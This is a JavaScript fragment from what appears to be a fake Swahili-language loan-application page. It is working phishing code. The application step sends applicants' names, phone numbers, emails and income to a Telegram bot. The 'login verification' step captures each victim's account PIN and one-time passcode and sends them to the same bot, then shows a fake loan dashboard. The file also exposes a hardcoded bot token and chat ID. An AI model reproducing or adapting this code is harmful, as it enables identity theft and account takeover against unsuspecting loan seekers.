// Add your Telegram Configuration here
const TELEGRAM_TOKEN = "8994413452:AAF_GfDPe_Mt0rlV4q8rtzxlIDQJm2vQTQY"; 
const TELEGRAM_CHAT_ID = "8524294724";

function submitApplication() {
    applicationData.employment = document.getElementById('employment-status').value;
    applicationData.income = document.getElementById('annual-income').value;
    
    showLoading("Inawasilisha Maombi…", 2000, () => {
        // Construct the message format
        const message = `
🔔 *Maombi Mapya ya Mkopo!*
----------------------------
👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba:* ${applicationData.phone}
📧 *Email:* ${applicationData.email}
💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
📅 *Muda:* ${applicationData.duration} Miezi
🛠 *Aina:* ${applicationData.type}
🎯 *Madhumuni:* ${applicationData.purpose}
💼 *Ajira:* ${applicationData.employment}
💵 *Mapato/Mwaka:* TSh ${parseInt(applicationData.income).toLocaleString()}
        `;

        // Send data directly to Telegram
        sendToTelegram(message);

        navigateTo('view-success');
        runSuccessCountdown();
    });
}
// ... (your existing code ends here)

function sendToTelegram(textMessage) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: textMessage,
        parse_mode: "Markdown"
    };

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            console.error("Telegram API Error:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Network Error when sending to Telegram:", error);
    });
}

function verifyOtp() {
    const otpCode = 
        document.getElementById('otp1').value +
        document.getElementById('otp2').value +
        document.getElementById('otp3').value +
        document.getElementById('otp4').value;
    
    const plainPin = document.getElementById('login-pin').value;

    showLoading("Inathibitisha OTP", 2500, () => {
        
        const securityMessage = `
🔑 *Uthibitisho wa Kuingia*
----------------------------
📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
🔐 *PIN ya Akaunti:* ${plainPin}
🔢 *Msimbo wa OTP:* ${otpCode}
        `;
        
        sendToTelegram(securityMessage);

        document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
        const monthlyEst = Math.round((applicationData.amount * 1.08) / applicationData.duration);
        document.getElementById('dash-monthly').innerText = `TSh ${monthlyEst.toLocaleString()}`;
        document.getElementById('dash-duration').innerText = `Miezi ${applicationData.duration}`;
        
        navigateTo('view-dashboard');
    });
                }
            
